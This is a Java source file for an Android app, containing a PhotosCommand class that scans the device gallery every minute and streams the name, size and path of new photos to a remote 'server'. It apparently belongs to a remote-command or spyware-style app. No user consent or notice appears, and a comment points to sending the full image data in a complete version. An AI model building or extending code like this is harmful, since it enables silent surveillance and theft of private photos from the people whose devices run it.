package com.example.myfirstapk.commands;

import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.PrintWriter;
import java.util.HashSet;
import java.util.Set;

/**
 * PhotosCommand handles automatic photo uploads from device gallery
 * Periodically scans for new photos and uploads them to the server
 */
public class PhotosCommand {
    private static final String TAG = "PhotosCommand";
    private static final int UPLOAD_INTERVAL = 60000; // 1 minute

    private final Context context;
    private PrintWriter out;
    private final Handler handler;
    private final Set<String> uploadedPhotos = new HashSet<>();
    private Runnable uploadRunnable;
    private boolean isRunning = false;

    public PhotosCommand(Context context, PrintWriter out, Handler handler) {
        this.context = context;
        this.out = out;
        this.handler = handler;
    }

    public void setOut(PrintWriter out) {
        this.out = out;
    }

    /**
     * Start automatic photo upload process
     */
    public void startAutoUpload() {
        if (isRunning) {
            Log.d(TAG, "Auto upload already running");
            return;
        }

        isRunning = true;
        Log.d(TAG, "📸 Starting auto photo upload");

        uploadRunnable = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    scanAndUploadPhotos();
                    handler.postDelayed(this, UPLOAD_INTERVAL);
                }
            }
        };

        handler.post(uploadRunnable);
    }

    /**
     * Stop automatic photo upload process
     */
    public void stopUpload() {
        isRunning = false;
        if (uploadRunnable != null) {
            handler.removeCallbacks(uploadRunnable);
        }
        Log.d(TAG, "📸 Stopped auto photo upload");
    }

    /**
     * Scan device for new photos and upload them
     */
    private void scanAndUploadPhotos() {
        new Thread(() -> {
            try {
                String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE
                };

                Cursor cursor = context.getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC"
                );

                if (cursor != null) {
                    int count = 0;
                    while (cursor.moveToNext() && count < 5) { // Limit to 5 photos per scan
                        String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                        long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));

                        if (path != null && !uploadedPhotos.contains(path)) {
                            File file = new File(path);
                            if (file.exists() && file.canRead() && size < 5 * 1024 * 1024) { // Max 5MB
                                uploadPhoto(file, path);
                                uploadedPhotos.add(path);
                                count++;
                            }
                        }
                    }
                    cursor.close();
                    
                    if (count > 0) {
                        Log.d(TAG, "📸 Uploaded " + count + " new photos");
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error scanning photos: " + e.getMessage(), e);
            }
        }).start();
    }

    /**
     * Upload a single photo file to the server
     */
    private void uploadPhoto(File file, String path) {
        try {
            if (out == null) {
                Log.e(TAG, "Cannot upload photo: no output stream");
                return;
            }

            // Send photo header
            out.println("[PHOTO_START]");
            out.println("[PHOTO_NAME] " + file.getName());
            out.println("[PHOTO_SIZE] " + file.length());
            out.flush();

            // Send notification that photo would be uploaded
            // In a full implementation, you'd send the binary data here
            out.println("[PHOTO_DATA] " + file.length() + " bytes from " + path);
            out.flush();

            Log.d(TAG, "📤 Uploaded photo: " + file.getName() + " (" + file.length() + " bytes)");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error uploading photo: " + e.getMessage(), e);
        }
    }

    /**
     * Clear the uploaded photos cache
     */
    public void clearCache() {
        uploadedPhotos.clear();
        Log.d(TAG, "🗑️ Cleared upload cache");
    }

    /**
     * Get the number of uploaded photos
     */
    public int getUploadedCount() {
        return uploadedPhotos.size();
    }
}
